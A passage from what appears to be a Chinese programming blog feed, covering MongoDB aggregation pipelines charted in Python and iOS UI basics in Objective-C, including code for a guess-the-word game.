area_day_posts.append(each_posts)</div><div class="line">        data = &#123;</div><div class="line">            <span class="string">'name'</span> : area,</div><div class="line">            <span class="string">'data'</span> : area_day_posts,</div><div class="line">            <span class="string">'type'</span> : <span class="string">'lines'</span></div><div class="line">        &#125;</div><div class="line">        <span class="keyword">yield</span> data</div></pre></td></tr></table></figure>
<h2 id="6-使用聚合管道高效查找数据MongoDB聚合管道"><a href="#6-使用聚合管道高效查找数据MongoDB聚合管道" class="headerlink" title="6.使用聚合管道高效查找数据MongoDB聚合管道"></a>6.使用聚合管道高效查找数据<a href="http://blog.csdn.net/zhangzhebjut/article/details/16848045" target="_blank" rel="external">MongoDB聚合管道</a></h2><figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/C4DFB493-E981-4C81-BEA9-DE3F088943A2.png" alt="常用的几种" title="" class="">
                <p>常用的几种</p>
            </figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#操作符的含义可以参考上面的链接,注意$group的操作是在内存中进行的，所以不能用它来对大量个数的文档来进行分组</span></div><div class="line">pipeline = [</div><div class="line">  &#123;<span class="string">'$match'</span>:&#123;<span class="string">'$and'</span>:[&#123;<span class="string">'pub_date'</span>:<span class="string">'2015.4.12'</span>&#125;,&#123;<span class="string">'time'</span>:<span class="number">3</span>&#125;]&#125;&#125;,</div><div class="line">  &#123;<span class="string">'$group'</span>:&#123;<span class="string">'_id'</span>:<span class="string">'$price'</span>,<span class="string">'counts'</span>:&#123;<span class="string">'$sum'</span>:<span class="number">1</span>&#125;&#125;&#125;,</div><div class="line">  &#123;<span class="string">'$sort'</span>:&#123;<span class="string">'counts'</span>:<span class="number">-1</span>&#125;&#125;,</div><div class="line">  &#123;<span class="string">'$limit'</span>:<span class="number">3</span>&#125;</div><div class="line">]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> item_info.aggregate(pipeline):</div><div class="line">    print(i)</div><div class="line"><span class="comment">#$slice如果只有一个参数，代表返回几个元素，如果有两个参数，第一个参数代表跳过几个元素，第二个参数代表返回几个元素。</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">data_gen</span><span class="params">(data, time)</span>:</span></div><div class="line">    pipeline = [</div><div class="line">  	&#123;<span class="string">'$match'</span>:&#123;<span class="string">'$and'</span>:[&#123;<span class="string">'pub_date'</span>:<span class="string">'2015.4.12'</span>&#125;,&#123;<span class="string">'time'</span>:<span class="number">3</span>&#125;]&#125;&#125;,</div><div class="line">  	&#123;<span class="string">'$group'</span>:&#123;<span class="string">'_id'</span>:&#123;<span class="string">'$slice'</span>:[<span class="string">'$cates'</span>:<span class="number">2</span>,<span class="number">1</span>]&#125;,<span class="string">'counts'</span>:		&#123;<span class="string">'$sum'</span>:<span class="number">1</span>&#125;&#125;&#125;,</div><div class="line">  	&#123;<span class="string">'sort'</span>:&#123;<span class="string">'counts'</span>:<span class="number">-1</span>&#125;&#125;</div><div class="line">	]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> item_info.aggregate(pipeline):</div><div class="line">    	<span class="keyword">yield</span> [i[<span class="string">'_id'</span>][<span class="number">0</span>], i[<span class="string">'counts'</span>]]</div><div class="line"><span class="comment">#制作饼图</span></div><div class="line">options = &#123;</div><div class="line">  <span class="string">'chart'</span> : &#123;<span class="string">'zoomType'</span>:<span class="string">'xy'</span>&#125;,</div><div class="line">  <span class="string">'title'</span> : &#123;<span class="string">'text'</span>:<span class="string">'发帖量统计'</span>&#125;,</div><div class="line">  <span class="string">'subtitle'</span> : &#123;<span class="string">'text'</span>:<span class="string">'可视化统计图表'</span>&#125;</div><div class="line">&#125;</div><div class="line">series = [&#123;</div><div class="line">  	<span class="string">'type'</span>:<span class="string">'pie'</span></div><div class="line">    <span class="string">'name'</span>:<span class="string">'pipe charts'</span>,</div><div class="line">    <span class="string">'date'</span>:[i <span class="keyword">for</span> i <span class="keyword">in</span> date_gen(<span class="string">'2016.01.10, 1'</span>)]</div><div class="line">    &#125;]</div><div class="line">charts.plot(series, options=options, show=<span class="string">'inline'</span>)</div></pre></td></tr></table></figure>
<h2 id="7-任务代码"><a href="#7-任务代码" class="headerlink" title="7.任务代码"></a>7.任务代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> charts</div><div class="line"><span class="keyword">import</span> pymongo</div><div class="line"></div><div class="line">client = pymongo.MongoClient(<span class="string">'localhost'</span>, <span class="number">27017</span>)</div><div class="line">ceshi = client[<span class="string">'ceshi'</span>]</div><div class="line">item_info = ceshi[<span class="string">'item_infoS'</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">data_gen</span><span class="params">(date1,date2,area,limit)</span>:</span></div><div class="line">    pipeline1 = [</div><div class="line">    &#123;<span class="string">'$match'</span>:&#123;<span class="string">'$and'</span>:[&#123;<span class="string">'pub_date'</span>:&#123;<span class="string">'$gte'</span>:date1,<span class="string">'$lte'</span>:date2&#125;&#125;,&#123;<span class="string">'area'</span>:&#123;<span class="string">'$all'</span>:area&#125;&#125;]&#125;&#125;,</div><div class="line">    &#123;<span class="string">'$group'</span>:&#123;<span class="string">'_id'</span>:&#123;<span class="string">'$slice'</span>:[<span class="string">'$cates'</span>,<span class="number">2</span>,<span class="number">1</span>]&#125;,<span class="string">'counts'</span>:&#123;<span class="string">'$sum'</span>:<span class="number">1</span>&#125;&#125;&#125;,</div><div class="line">    &#123;<span class="string">'$limit'</span>:limit&#125;,</div><div class="line">    &#123;<span class="string">'$sort'</span>:&#123;<span class="string">'counts'</span>:<span class="number">-1</span>&#125;&#125;</div><div class="line">]</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> item_info.aggregate(pipeline1):</div><div class="line">        data = &#123;</div><div class="line">            <span class="string">'name'</span>: i[<span class="string">'_id'</span>][<span class="number">0</span>],</div><div class="line">            <span class="string">'data'</span>: [i[<span class="string">'counts'</span>]],</div><div class="line">            <span class="string">'type'</span>: <span class="string">'column'</span></div><div class="line">        &#125;</div><div class="line">        <span class="keyword">yield</span> data</div><div class="line">series = [i <span class="keyword">for</span> i <span class="keyword">in</span> data_gen(<span class="string">'2015.12.25'</span>,<span class="string">'2015.12.27'</span>,[<span class="string">'朝阳'</span>],<span class="number">5</span>)]</div><div class="line">options = &#123;</div><div class="line">    <span class="string">'chart'</span>   : &#123;<span class="string">'zoomType'</span>:<span class="string">'xy'</span>&#125;,</div><div class="line">    <span class="string">'title'</span>   : &#123;<span class="string">'text'</span>: <span class="string">'发帖数量最大的类目'</span>&#125;,</div><div class="line">    <span class="string">'subtitle'</span>: &#123;<span class="string">'text'</span>: <span class="string">'数据图表'</span>&#125;,</div><div class="line">    <span class="string">'yAxis'</span>   : &#123;<span class="string">'title'</span>: &#123;<span class="string">'text'</span>: <span class="string">'数量'</span>&#125;&#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">charts.plot(series,options=options,show=<span class="string">'inline'</span>)</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/9361A126-4FA8-42FF-8811-A3B6D70ABAFE.png" alt="" title="" class="">
                <p></p>
            </figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#另一种charts的调用方式</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">data_gen2</span><span class="params">(date1,date2,cates)</span>:</span></div><div class="line">    pipeline = [</div><div class="line">    &#123;<span class="string">'$match'</span>:&#123;<span class="string">'$and'</span>:[&#123;<span class="string">'pub_date'</span>:&#123;<span class="string">'$gte'</span>:date1,<span class="string">'$lte'</span>:date2&#125;&#125;,</div><div class="line">                       &#123;<span class="string">'cates'</span>:&#123;<span class="string">'$all'</span>:cates&#125;&#125;,</div><div class="line">                       &#123;<span class="string">'look'</span>:&#123;<span class="string">'$nin'</span>:[<span class="string">'-'</span>]&#125;&#125;</div><div class="line">                      ]&#125;&#125;,</div><div class="line">    &#123;<span class="string">'$group'</span>:&#123;<span class="string">'_id'</span>:<span class="string">'$look'</span>,<span class="string">'avg_price'</span>:&#123;<span class="string">'$avg'</span>:<span class="string">'$price'</span>&#125;&#125;&#125;,</div><div class="line">    &#123;<span class="string">'$sort'</span>:&#123;<span class="string">'avg_price'</span>:<span class="number">1</span>&#125;&#125;</div><div class="line">]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> item_info.aggregate(pipeline):</div><div class="line">        <span class="keyword">yield</span> i[<span class="string">'avg_price'</span>]</div><div class="line">data = [i <span class="keyword">for</span> i <span class="keyword">in</span> data_gen2(<span class="string">'2015.12.24'</span>,<span class="string">'2016.01.10'</span>,[<span class="string">'北京二手手机'</span>])]</div><div class="line">options = &#123;</div><div class="line">    <span class="string">'title'</span>: &#123;<span class="string">'text'</span>: <span class="string">'新旧-价格'</span>&#125;,</div><div class="line">    <span class="string">'xAxis'</span>   : &#123;<span class="string">'categories'</span>: [<span class="string">'报废机/尸体'</span>,<span class="string">'7成新及以下'</span>,<span class="string">'8成新'</span>,<span class="string">'9成新'</span>,<span class="string">'95成新'</span>,<span class="string">'99成新'</span>, <span class="string">'全新'</span>]&#125;,</div><div class="line">    <span class="string">'yAxis'</span>   : &#123;<span class="string">'title'</span>: &#123;<span class="string">'text'</span>: <span class="string">'价格'</span>&#125;&#125;,</div><div class="line">    </div><div class="line">&#125;</div><div class="line"></div><div class="line">charts.plot(data,show=<span class="string">'inline'</span>, options=options)</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-05-10%20%E4%B8%8B%E5%8D%881.28.24.png" alt="" title="" class="">
                <p></p>
            </figure>]]></content>
      
        <categories>
            
            <category> Ipython 图表化 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS-UI学习(三)]]></title>
      <url>/2017/05/18/iOS-UI%E5%AD%A6%E4%B9%A0-%E4%B8%89/</url>
      <content type="html"><![CDATA[<p>UI初步（三）<br><a id="more"></a></p>
<h1 id="UI基础Day4"><a href="#UI基础Day4" class="headerlink" title="UI基础Day4"></a>UI基础Day4</h1><h2 id="1-应用图标的启动图片的设置"><a href="#1-应用图标的启动图片的设置" class="headerlink" title="1.应用图标的启动图片的设置"></a>1.应用图标的启动图片的设置</h2><blockquote>
<p>应用图标：将尺寸合适的图片拖入Assets.xcassets中的Applcon中</p>
<p>启动图片：在项目栏中找到Launch Images Source,点击后面的方框,删掉Launch Screen File来进行修改(iOS7及之前，iOS8以后直接在Launch Screen进行插入图片),<a href="http://www.jianshu.com/p/a3315f6896a7" target="_blank" rel="external">参考7</a>，<a href="http://www.liuchuo.net/archives/2537" target="_blank" rel="external">参考8</a>,注意屏幕尺寸一定要做适配</p>
</blockquote>
<h2 id="2-屏幕尺寸和图片规格介绍"><a href="#2-屏幕尺寸和图片规格介绍" class="headerlink" title="2.屏幕尺寸和图片规格介绍"></a>2.屏幕尺寸和图片规格介绍</h2><p>屏幕尺寸：</p>
<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/6D43B2B7-6DD9-4B71-B1D9-F012564F18AD.png" alt="" title="" class="">
                <p></p>
            </figure>
<p>图片规格：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-05-16%20%E4%B8%8A%E5%8D%8810.32.56.png" alt="" title="" class="">
                <p></p>
            </figure>
<h2 id="3-状态栏的设置参考博客"><a href="#3-状态栏的设置参考博客" class="headerlink" title="3.状态栏的设置参考博客"></a>3.状态栏的设置<a href="http://www.jianshu.com/p/5aa05983b445" target="_blank" rel="external">参考博客</a></h2><p>加载启动图片时，如果不想显示状态栏可以在project中设置属性Hide status bar</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-05-16%20%E4%B8%8A%E5%8D%8811.32.03.png" alt="" title="" class="">
                <p></p>
            </figure>
<p>进入main.storyboard,在背景图片是黑色的时候，如果要显示状态栏，可以通过代码实现，<a href="http://www.jianshu.com/p/9f7f3fa624e7" target="_blank" rel="external">app状态栏样式设计</a>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">-(UIStatusBarStyle)preferredStatusBarStyle&#123;</div><div class="line">    return UIStatusBarStyleLightContent;</div><div class="line">&#125;</div><div class="line">//隐藏状态栏</div><div class="line">-(BOOL)preferredStatusBarStyle&#123;</div><div class="line">    return YES;</div></pre></td></tr></table></figure>
<h2 id="4-不同状态的按钮设置（代码）"><a href="#4-不同状态的按钮设置（代码）" class="headerlink" title="4.不同状态的按钮设置（代码）"></a>4.不同状态的按钮设置（代码）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[button setBackgroundImage:[UIImage imageNamed:@&quot;btn_answer&quot; ] forState:UIControlStateNormal];</div><div class="line">[button setBackgroundImage:[UIImage imageNamed:@&quot;btn_answer_highlighted&quot; ] forState:UIControlStateHighlighted];</div><div class="line">//记得最后初始化之后要将按钮加入到父控件当中</div><div class="line">[_answerView addSubview:button];</div></pre></td></tr></table></figure>
<h2 id="5-对于self-super-init-的思考"><a href="#5-对于self-super-init-的思考" class="headerlink" title="5.对于self = [super init]的思考"></a>5.对于self = [super init]的思考</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">- (instancetype)init</div><div class="line">&#123;</div><div class="line">    if (self = [super init]) &#123;</div><div class="line">        // Custom initialization</div><div class="line">    &#125;</div><div class="line">    return self;</div><div class="line">&#125;</div><div class="line">//alloc返回一个有效的未初始化的对象实例。对于self是alloc 返回的指针，同时可以在所有的方法作用域内访问。</div><div class="line">//如果初始化一个对象失败，就会返回nil，当返回nil的时候self = [super init]测试的主体就不会再继续执行。如果不这样做，你可能会操作一个不可用的对象，它的行为是不可预测的，最终可能会导致你的程序崩溃。</div></pre></td></tr></table></figure>
<p><code>self</code>表示当前这个类的对象，而<code>super</code>是一个编译器标示符，和<code>self</code>指向同一个消息接受者。在本例中，无论是<code>[self class]</code>还是<code>[super class]</code>，接受消息者都是<code>Son</code>对象，但<code>super</code>与<code>self</code>不同的是，<code>self</code>调用<code>class</code>方法时，是在子类<code>Son</code>中查找方法，而<code>super</code>调用<code>class</code>方法时，是在父类<code>Father</code>中查找方法。</p>
<h2 id="6-对象初始化方式的比较"><a href="#6-对象初始化方式的比较" class="headerlink" title="6.对象初始化方式的比较"></a>6.对象初始化方式的比较</h2><p>[class new]和[[class alloc]init]源码分析：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">+ new </div><div class="line">&#123; </div><div class="line">    id newObject = (*_alloc)((Class)self, 0); </div><div class="line">    Class metaClass = self-&gt;isa; </div><div class="line">    if (class_getVersion(metaClass) &gt; 1) </div><div class="line">    return [newObject init]; </div><div class="line">    else </div><div class="line">    return newObject; </div><div class="line">&#125; </div><div class="line"></div><div class="line">//而 alloc/init 像这样： </div><div class="line">+ alloc </div><div class="line">&#123; </div><div class="line">    return (*_zoneAlloc)((Class)self, 0, malloc_default_zone());  </div><div class="line">&#125; </div><div class="line">- init </div><div class="line">&#123; </div><div class="line">    return self; </div><div class="line">&#125;</div><div class="line">//[class new]默认调用 alloc与init方法，那么我们无法使用自定义的初始化方法，多了更多的局限性。那么[class alloc] init] 会更方便， 当然[class alloc] init] 的设计也是由于历史的原因。</div></pre></td></tr></table></figure>
<h2 id="7-字典转模型实现懒加载的过程"><a href="#7-字典转模型实现懒加载的过程" class="headerlink" title="7.字典转模型实现懒加载的过程"></a>7.字典转模型实现懒加载的过程</h2><blockquote>
<p>读取文件路径</p>
<p>读取文件到临时数组</p>
<p>创建一个可变数组</p>
<p>遍历临时数组中的字典转为模型，存放到可变数组</p>
<p>把可变数组赋值给属性数组</p>
</blockquote>
<h2 id="8-清除子控件的方法"><a href="#8-清除子控件的方法" class="headerlink" title="8.清除子控件的方法"></a>8.清除子控件的方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">//1.遍历子控件，一个个删除</div><div class="line">for(UIView *view in _answer.subviews)&#123;</div><div class="line">	[view removeFromSuperiew];</div><div class="line">&#125;</div><div class="line">//2.让让数组中所有的元素都执行清除方法</div><div class="line"> [_answerView.subviews makeObjectsPerformSelector:@selector(removeFromSuperview)];</div><div class="line">//为了内存优化，需要将上一次加载的子控件的内存释放掉</div></pre></td></tr></table></figure>
<h2 id="9-猜字谜代码讲解"><a href="#9-猜字谜代码讲解" class="headerlink" title="9.猜字谜代码讲解"></a>9.猜字谜代码讲解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div></pre></td><td class="code"><pre><div class="line">//ViewController.m</div><div class="line"></div><div class="line">#import &quot;ViewController.h&quot;</div><div class="line"></div><div class="line">#import &quot;GuessModel.h&quot;</div><div class="line"></div><div class="line">#define kButtonWidth 30</div><div class="line"></div><div class="line">#define kMargin 10</div><div class="line"></div><div class="line">#define kScreenSize [UIScreen mainScreen].bounds.size</div><div class="line"></div><div class="line">@interface ViewController ()</div><div class="line">@property (weak, nonatomic) IBOutlet UILabel *indexLabel;</div><div class="line">@property (weak, nonatomic) IBOutlet UILabel *titleLabel;</div><div class="line">@property (weak, nonatomic) IBOutlet UIButton *coinButton;</div><div class="line">@property (weak, nonatomic) IBOutlet UIButton *imageButton;</div><div class="line">@property (weak, nonatomic) IBOutlet UIView *answerView;</div><div class="line">@property (weak, nonatomic) IBOutlet UIView *optionView;</div><div class="line">@property (weak, nonatomic) IBOutlet UIButton *nextButton;</div><div class="line">@property (strong, nonatomic) NSArray *dataArray;</div><div class="line">@property (nonatomic, assign) NSInteger index;</div><div class="line">@property (weak ,nonatomic) UIView *coverView;</div><div class="line">@property (weak, nonatomic) IBOutlet UITextField *gua;</div><div class="line">@end</div><div class="line"></div><div class="line">@implementation ViewController</div><div class="line">-(NSArray *)dataArray&#123;</div><div class="line">    if(_dataArray==nil)&#123;</div><div class="line">        NSString *path = [[NSBundle mainBundle]pathForResource:@&quot;questions.plist&quot; ofType:nil];</div><div class="line">        NSArray *tempArray = [NSArray arrayWithContentsOfFile:path];</div><div class="line">        NSMutableArray *mutableArray = [NSMutableArray array];</div><div class="line">        for (NSDictionary *dict in tempArray)&#123;</div><div class="line">            GuessModel *guessModel = [GuessModel guessModelDict:dict];</div><div class="line">            [mutableArray addObject:guessModel];</div><div class="line">        &#125;</div><div class="line">        _dataArray = mutableArray;</div><div class="line">    &#125;</div><div class="line">    return _dataArray;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)viewDidLoad &#123;</div><div class="line">    [super viewDidLoad];</div><div class="line">    self.index = 1;</div><div class="line">    [self setupUI];</div><div class="line">    [self initCoverView];</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)initCoverView&#123;</div><div class="line">    UIView *coverView = [[UIView alloc]initWithFrame:self.view.bounds];</div><div class="line">    //进行属性的关联</div><div class="line">    self.coverView = coverView;</div><div class="line">    coverView.alpha = 0;</div><div class="line">    [coverView setBackgroundColor:[UIColor blackColor]];</div><div class="line">    [self.view addSubview:coverView];</div><div class="line">&#125;</div><div class="line"></div><div class="line">-(void)setupUI&#123;</div><div class="line">    GuessModel *guessModel = self.dataArray[_index-1];</div><div class="line">    _indexLabel.text = [NSString stringWithFormat:@&quot;%ld/%ld&quot;,_index, self.dataArray.count];</div><div class="line">    _titleLabel.text = guessModel.title;</div><div class="line">    NSString *imageName = guessModel.icon;</div><div class="line">    [_imageButton setImage:[UIImage imageNamed:imageName] forState:UIControlStateNormal];</div><div class="line">    //获取答案的长度</div><div class="line">    NSString *answer = guessModel.answer;</div><div class="line">    NSInteger length = answer.length;</div><div class="line">    [self setupAnswerViewWithLength:length];</div><div class="line">    [self setupOptionViewWithOptions:guessModel.options];</div><div class="line">&#125;</div><div class="line"></div><div class="line">-(void)setupOptionViewWithOptions:(NSArray *)options&#123;</div><div class="line">    int column = 7;</div><div class="line">    NSInteger count = options.count;</div><div class="line">    CGFloat margin = (kScreenSize.width - column*kButtonWidth)/(column+1);</div><div class="line">    [_optionView.subviews makeObjectsPerformSelector:@selector(removeFromSuperview)];</div><div class="line">    for(int i = 0;i &lt; count;i++)&#123;</div><div class="line">        NSInteger rowIndex = i/column;</div><div class="line">        NSInteger columnIndex = i%column;</div><div class="line">        CGFloat buttonX = (columnIndex + 1)*margin + columnIndex*kButtonWidth;</div><div class="line">        CGFloat buttonY = rowIndex*margin + rowIndex*kButtonWidth;</div><div class="line">        UIButton *button = [[UIButton alloc]initWithFrame:CGRectMake(buttonX, buttonY, kButtonWidth, kButtonWidth)];</div><div class="line">        [button setBackgroundImage:[UIImage imageNamed:@&quot;btn_option&quot;] forState:UIControlStateNormal];</div><div class="line">        [button setBackgroundImage:[UIImage imageNamed:@&quot;btn_option_highlighted&quot; ] forState:UIControlStateHighlighted];</div><div class="line">        [button setTitle:options[i] forState:UIControlStateNormal];</div><div class="line">        [button setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];</div><div class="line">        [button addTarget:self action:@selector(didClickOptionButton:) forControlEvents:UIControlEventTouchUpInside];</div><div class="line">        [_optionView addSubview:button];</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">&#125;</div><div class="line"></div><div 